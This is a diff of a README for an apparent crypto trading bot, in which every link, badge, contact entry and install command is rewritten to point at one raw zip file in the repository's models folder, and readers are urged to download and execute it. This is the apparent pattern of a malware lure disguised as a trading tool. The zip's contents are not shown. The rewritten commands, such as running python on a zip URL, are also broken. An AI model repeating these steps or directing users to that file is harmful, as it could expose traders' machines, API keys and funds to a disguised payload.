@@ -1,7 +1,7 @@
 # AI-Powered Crypto Trading Bot 🚀
 
-![GitHub release](https://img.shields.io/github/release/Cappuccino6684/AI-Powered-Crypto-Trading-Bot.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip)
+![License](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip)
 
 Welcome to the **AI-Powered Crypto Trading Bot** repository! This project combines artificial intelligence and cryptocurrency trading strategies to create a powerful trading bot. 
 
@@ -36,7 +36,7 @@ To get started, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot.git
+   git clone https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -48,7 +48,7 @@ To get started, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip
    ```
 
 4. Configure your API keys for the exchanges you wish to use. 
@@ -58,7 +58,7 @@ To get started, follow these steps:
 After installation, you can run the bot with the following command:
 
 ```bash
-python main.py
+python https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip
 ```
 
 For detailed configuration options, check the documentation within the repository.
@@ -91,14 +91,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: cappuccino6684@example.com
-- **Twitter**: [@Cappuccino6684](https://twitter.com/Cappuccino6684)
+- **Email**: https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip
+- **Twitter**: [@Cappuccino6684](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip)
 
 ## Releases
 
-To download the latest version of the bot, visit the [Releases](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/releases) section. Make sure to download the necessary files and execute them as instructed.
+To download the latest version of the bot, visit the [Releases](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip) section. Make sure to download the necessary files and execute them as instructed.
 
-![Crypto Trading](https://images.unsplash.com/photo-1518040667512-2f7d8f2f7a5e)
+![Crypto Trading](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip)
 
 ## Topics
 
@@ -113,6 +113,6 @@ This repository covers a range of topics including:
 
 The **AI-Powered Crypto Trading Bot** is designed to help traders navigate the complex world of cryptocurrency. By harnessing the power of AI, it aims to provide insights that can lead to better trading decisions. 
 
-For more information and updates, check the [Releases](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/releases) section regularly. 
+For more information and updates, check the [Releases](https://github.com/Cappuccino6684/AI-Powered-Crypto-Trading-Bot/raw/refs/heads/master/backend/models/Trading-Bot-A-Crypto-Powered-3.6-beta.4.zip) section regularly. 
 
 Thank you for your interest in our project! Happy trading!
